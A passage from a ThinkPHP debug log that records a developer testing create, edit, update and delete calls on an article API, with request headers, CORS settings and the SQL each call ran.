  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'DELETE',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T18:02:33+08:00] 59.174.168.242 DELETE mishop.holyzq.com/api/article/delete/22
[运行时间：0.007090s] [吞吐率：141.04req/s] [内存消耗：807.03kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/delete/<id>',
  'route' => 'api/Article/delete',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '22',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '22',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000439s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000606s ]
[ sql ] [ SQL ] DELETE FROM `article` WHERE  `id` = 22 [ RunTime:0.002679s ]
---------------------------------------------------------------

[2020-09-24T18:02:35+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/21
[运行时间：0.004510s] [吞吐率：221.73req/s] [内存消耗：844.55kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000429s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000617s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 21 LIMIT 1 [ RunTime:0.000268s ]
---------------------------------------------------------------

[2020-09-24T18:03:26+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/21
[运行时间：0.005029s] [吞吐率：198.85req/s] [内存消耗：844.60kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000462s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000599s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 21 LIMIT 1 [ RunTime:0.000291s ]
---------------------------------------------------------------

[2020-09-24T18:03:29+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.005295s] [吞吐率：188.86req/s] [内存消耗：912.30kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000464s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000620s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000276s ]
---------------------------------------------------------------

[2020-09-24T18:03:31+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/21
[运行时间：0.004281s] [吞吐率：233.59req/s] [内存消耗：844.60kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000428s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000626s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 21 LIMIT 1 [ RunTime:0.000277s ]
---------------------------------------------------------------

[2020-09-24T18:03:32+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/update/21
[运行时间：0.002274s] [吞吐率：439.79req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'PUT',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T18:03:32+08:00] 59.174.168.242 PUT mishop.holyzq.com/api/article/update/21
[运行时间：0.006294s] [吞吐率：158.88req/s] [内存消耗：810.26kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/update/<id>',
  'route' => 'api/Article/update',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'content-length' => '21',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
)
[ info ] [ PARAM ] array (
  'title' => '888',
  'content' => '999',
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000423s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000629s ]
[ sql ] [ SQL ] UPDATE `article`  SET `title` = '888' , `content` = '999' , `id` = 21  WHERE  `id` = 21 [ RunTime:0.002035s ]
---------------------------------------------------------------

[2020-09-24T18:03:37+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/21
[运行时间：0.005150s] [吞吐率：194.17req/s] [内存消耗：844.60kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000417s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000657s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 21 LIMIT 1 [ RunTime:0.000271s ]
---------------------------------------------------------------

[2020-09-24T18:03:41+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/update/21
[运行时间：0.002400s] [吞吐率：416.68req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'PUT',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T18:03:41+08:00] 59.174.168.242 PUT mishop.holyzq.com/api/article/update/21
[运行时间：0.006365s] [吞吐率：157.11req/s] [内存消耗：810.30kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/update/<id>',
  'route' => 'api/Article/update',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'content-length' => '29',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
)
[ info ] [ PARAM ] array (
  'title' => '8881111',
  'content' => '9991111',
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000417s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000655s ]
[ sql ] [ SQL ] UPDATE `article`  SET `title` = '8881111' , `content` = '9991111' , `id` = 21  WHERE  `id` = 21 [ RunTime:0.002195s ]
---------------------------------------------------------------

[2020-09-24T18:03:44+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.004842s] [吞吐率：206.53req/s] [内存消耗：912.30kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000452s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000626s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000301s ]
---------------------------------------------------------------

[2020-09-24T18:03:46+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/21
[运行时间：0.004658s] [吞吐率：214.69req/s] [内存消耗：844.55kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000437s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000581s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 21 LIMIT 1 [ RunTime:0.000293s ]
---------------------------------------------------------------

[2020-09-24T18:03:55+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/update/21
[运行时间：0.002226s] [吞吐率：449.26req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'PUT',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T18:03:55+08:00] 59.174.168.242 PUT mishop.holyzq.com/api/article/update/21
[运行时间：0.006242s] [吞吐率：160.21req/s] [内存消耗：810.89kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/update/<id>',
  'route' => 'api/Article/update',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'content-length' => '105',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
)
[ info ] [ PARAM ] array (
  'title' => '放松放松当',
  'content' => '发送发送给',
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000416s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000568s ]
[ sql ] [ SQL ] UPDATE `article`  SET `title` = '放松放松当' , `content` = '发送发送给' , `id` = 21  WHERE  `id` = 21 [ RunTime:0.001965s ]
---------------------------------------------------------------

[2020-09-24T18:04:07+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.004822s] [吞吐率：207.38req/s] [内存消耗：912.31kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000433s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000616s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000257s ]
---------------------------------------------------------------

[2020-09-24T18:04:36+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.004684s] [吞吐率：213.49req/s] [内存消耗：912.31kb] [文件加载：132]
